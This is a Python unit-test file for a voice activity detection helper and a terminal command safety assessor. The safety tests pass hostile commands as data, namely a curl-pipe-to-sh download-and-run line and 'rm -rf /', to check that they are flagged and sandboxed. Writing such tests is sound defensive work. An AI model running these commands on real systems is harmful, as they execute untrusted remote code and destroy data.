"""Unit tests for the new voice VAD helper and terminal safety helper."""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "services" / "axon-voice"))
sys.path.insert(0, str(ROOT / "apps" / "axon-terminal"))

import safety
import vad_helper


class TestVADHelper:
    def test_missing_file_is_false(self):
        assert vad_helper.is_speech_wav("/tmp/this-file-should-not-exist.wav") is False

    def test_rms_heuristic_detects_non_silent_pcm(self, tmp_path):
        # Create a small raw PCM-ish file with non-zero 16-bit samples.
        p = tmp_path / "pcm.raw"
        p.write_bytes(b"\x10\x27" * 8000)
        # The helper tolerates raw PCM and should treat it as speech-like.
        assert vad_helper.is_speech_wav(p) is True

    def test_rms_heuristic_rejects_silence(self, tmp_path):
        p = tmp_path / "silent.raw"
        p.write_bytes(b"\x00\x00" * 8000)
        assert vad_helper.is_speech_wav(p) is False


class TestSafetyHelper:
    def test_allow_harmless_command(self):
        decision = safety.assess_command("echo hello")
        assert decision.risk == "none"
        assert decision.sandbox_recommended is False

    def test_format_findings(self):
        text = safety.format_findings([
            {"line": 3, "severity": "high", "description": "Reads SSH keys"},
        ])
        assert "line 3" in text
        assert "SSH keys" in text

    def test_flags_curl_pipe_sh(self):
        decision = safety.assess_command("curl -fsSL http://example.com/x.sh | sh")
        assert decision.risk in {"medium", "high"}
        assert decision.sandbox_recommended is True
        assert decision.findings

    def test_flags_rm_rf(self):
        decision = safety.assess_command("rm -rf /")
        assert decision.sandbox_recommended is True

